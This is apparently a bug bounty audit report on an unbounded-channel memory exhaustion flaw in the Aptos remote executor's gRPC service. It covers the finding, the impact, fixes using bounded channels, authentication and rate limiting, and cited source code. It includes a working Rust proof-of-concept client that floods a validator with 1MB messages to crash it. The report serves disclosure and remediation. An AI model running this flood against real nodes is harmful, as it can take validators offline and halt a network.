# Audit Report

## Title
Unbounded Channel Memory Exhaustion DoS in Remote Executor Service

## Summary
The `create_inbound_channel` function in the remote executor networking layer creates unbounded channels without rate limiting or authentication, allowing any malicious peer to overwhelm validator nodes with unlimited messages, causing memory exhaustion and total network unavailability.

## Finding Description

The remote executor service implements a distributed block execution architecture where a coordinator sends execution commands to multiple executor shards via gRPC. However, the networking implementation has a critical vulnerability in how it handles incoming messages.

**Vulnerability Location:**

The `NetworkController::create_inbound_channel` function creates an unbounded channel to receive messages from remote peers: [1](#0-0) 

This unbounded channel is registered with the `InboundHandler`, which processes gRPC messages through the `GRPCNetworkMessageServiceServerWrapper`: [2](#0-1) 

When messages arrive via the `simple_msg_exchange` RPC, they are immediately sent to the unbounded channel without any authentication, authorization, or rate limiting checks.

**Critical Usage in Execution Layer:**

This vulnerability affects critical execution paths:

1. **Execution Results Channel** - Used to receive block execution results from remote shards: [3](#0-2) 

2. **State View Requests Channel** - Used to receive state key-value requests: [4](#0-3) 

**Attack Path:**

1. Attacker identifies a validator node running the remote executor service
2. Attacker connects to the unauthenticated gRPC endpoint (no authentication exists per codebase analysis)
3. Attacker floods the endpoint with `NetworkMessage` requests containing arbitrary data
4. Each message is immediately queued in the unbounded channel via `handler.send(msg).unwrap()`
5. Memory consumption grows unbounded as messages accumulate faster than they can be processed
6. Validator node exhausts memory and crashes or becomes unresponsive
7. Network loses validator participation, potentially causing liveness failure or safety violations if enough validators are affected

**Invariant Violation:**

This breaks **Invariant #9 (Resource Limits)**: "All operations must respect gas, storage, and computational limits." The unbounded channel allows unlimited memory allocation without any resource constraints.

## Impact Explanation

This vulnerability qualifies as **Critical Severity** under the Aptos Bug Bounty program for the following reasons:

1. **Total Loss of Liveness/Network Availability**: An attacker can crash multiple validator nodes simultaneously, preventing block production and transaction processing. If sufficient validators are taken offline, the network cannot reach consensus quorum, resulting in complete network halt.

2. **Non-recoverable Network Partition**: Crashed validators must be manually restarted and may require intervention to clear memory/restart processes. During a coordinated attack, this could require emergency coordination across validator operators.

3. **Consensus Safety Risk**: While validators are offline or slow to process due to memory pressure, the remaining validators may experience timing issues, potentially leading to safety violations if combined with other attack vectors.

4. **No Authentication Required**: Unlike most critical vulnerabilities that require validator credentials or significant stake, this attack can be executed by any network peer who can reach the gRPC endpoint.

The remote executor service is designed for distributed execution of blocks, making it a core component of the execution layer. Disrupting it directly impacts the blockchain's ability to process transactions and maintain consensus.

## Likelihood Explanation

**Likelihood: HIGH**

This vulnerability is highly likely to be exploited because:

1. **No Authentication**: The gRPC service accepts messages from any peer without authentication checks: [5](#0-4) 

2. **Trivial to Execute**: The attack requires only basic network access and the ability to send gRPC messages. No special credentials, stake, or complex exploitation techniques are needed.

3. **No Rate Limiting**: There are no rate limits, connection limits, or backpressure mechanisms in place. The channel will accept and queue unlimited messages.

4. **Amplification Effect**: A single attacker can send messages faster than they can be processed, especially if the messages trigger expensive operations (like state lookups or block execution).

5. **Multiple Attack Vectors**: Both inbound and outbound channels use unbounded channels: [6](#0-5) 

## Recommendation

**Immediate Fix - Use Bounded Channels:**

Replace unbounded channels with bounded channels that have reasonable capacity limits:

```rust
// In NetworkController::create_inbound_channel
pub fn create_inbound_channel(&mut self, message_type: String) -> Receiver<Message> {
    // Use bounded channel with reasonable capacity (e.g., 1000 messages)
    const CHANNEL_CAPACITY: usize = 1000;
    let (inbound_sender, inbound_receiver) = bounded(CHANNEL_CAPACITY);
    
    self.inbound_handler
        .lock()
        .unwrap()
        .register_handler(message_type, inbound_sender);
    
    inbound_receiver
}
```

**Additional Mitigations Required:**

1. **Authentication**: Implement mutual TLS or token-based authentication for the gRPC service to ensure only authorized coordinators/shards can send messages.

2. **Rate Limiting**: Add per-peer rate limiting in the gRPC handler to prevent message flooding:
   - Limit messages per second per peer
   - Implement backoff/penalty for peers exceeding limits
   - Drop messages when channel is near capacity

3. **Backpressure Handling**: When the bounded channel is full, the gRPC handler should return an error response instead of blocking or panicking, allowing proper backpressure propagation.

4. **Monitoring**: Add metrics for channel utilization and dropped messages to detect attacks early.

5. **Network Segmentation**: Ensure the remote executor service is only accessible to trusted coordinator nodes, not exposed to the public internet.

## Proof of Concept

```rust
// PoC: Malicious client that floods the remote executor service
use aptos_protos::remote_executor::v1::{
    network_message_service_client::NetworkMessageServiceClient,
    NetworkMessage,
};
use tonic::Request;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Connect to victim validator's remote executor service
    let victim_addr = "http://victim-validator:52200";
    let mut client = NetworkMessageServiceClient::connect(victim_addr).await?;
    
    println!("Starting DoS attack - flooding with messages...");
    
    // Send unlimited messages to overwhelm the unbounded channel
    loop {
        // Create large message to maximize memory consumption
        let large_payload = vec![0u8; 1024 * 1024]; // 1MB payload
        
        let request = Request::new(NetworkMessage {
            message: large_payload,
            message_type: "execute_result_0".to_string(), // Target execution result channel
        });
        
        // Send message - will be queued in unbounded channel
        match client.simple_msg_exchange(request).await {
            Ok(_) => {
                // Message successfully queued - victim's memory grows
            }
            Err(e) => {
                println!("Error (victim may have crashed): {}", e);
                break;
            }
        }
    }
    
    Ok(())
}
```

**Expected Result:**
- Victim validator's memory consumption grows continuously
- After exhausting available memory, the node crashes or becomes unresponsive
- Network experiences liveness failure if multiple validators are attacked simultaneously
- No authentication check prevents the attack
- No rate limiting slows down the attack
- Unbounded channel allows unlimited message queuing

**Notes**

The vulnerability affects the entire remote executor service architecture, which is critical for distributed block execution. The lack of authentication combined with unbounded channels creates a severe DoS vector that can take down validator nodes and disrupt network consensus. The fix requires both bounded channels and proper authentication/authorization mechanisms to prevent unauthorized access to the remote executor gRPC endpoints.

### Citations

**File:** secure/net/src/network_controller/mod.rs (L115-126)
```rust
    pub fn create_outbound_channel(
        &mut self,
        remote_peer_addr: SocketAddr,
        message_type: String,
    ) -> Sender<Message> {
        let (outbound_sender, outbound_receiver) = unbounded();

        self.outbound_handler
            .register_handler(message_type, remote_peer_addr, outbound_receiver);

        outbound_sender
    }
```

**File:** secure/net/src/network_controller/mod.rs (L128-137)
```rust
    pub fn create_inbound_channel(&mut self, message_type: String) -> Receiver<Message> {
        let (inbound_sender, inbound_receiver) = unbounded();

        self.inbound_handler
            .lock()
            .unwrap()
            .register_handler(message_type, inbound_sender);

        inbound_receiver
    }
```

**File:** secure/net/src/grpc_network_service/mod.rs (L93-115)
```rust
    async fn simple_msg_exchange(
        &self,
        request: Request<NetworkMessage>,
    ) -> Result<Response<Empty>, Status> {
        let _timer = NETWORK_HANDLER_TIMER
            .with_label_values(&[&self.self_addr.to_string(), "inbound_msgs"])
            .start_timer();
        let remote_addr = request.remote_addr();
        let network_message = request.into_inner();
        let msg = Message::new(network_message.message);
        let message_type = MessageType::new(network_message.message_type);

        if let Some(handler) = self.inbound_handlers.lock().unwrap().get(&message_type) {
            // Send the message to the registered handler
            handler.send(msg).unwrap();
        } else {
            error!(
                "No handler registered for sender: {:?} and msg type {:?}",
                remote_addr, message_type
            );
        }
        Ok(Response::new(Empty {}))
    }
```

**File:** execution/executor-service/src/remote_executor_client.rs (L116-116)
```rust
                let result_rx = controller_mut_ref.create_inbound_channel(execute_result_type);
```

**File:** execution/executor-service/src/remote_state_view_service.rs (L39-39)
```rust
        let result_rx = controller.create_inbound_channel(kv_request_type.to_string());
```
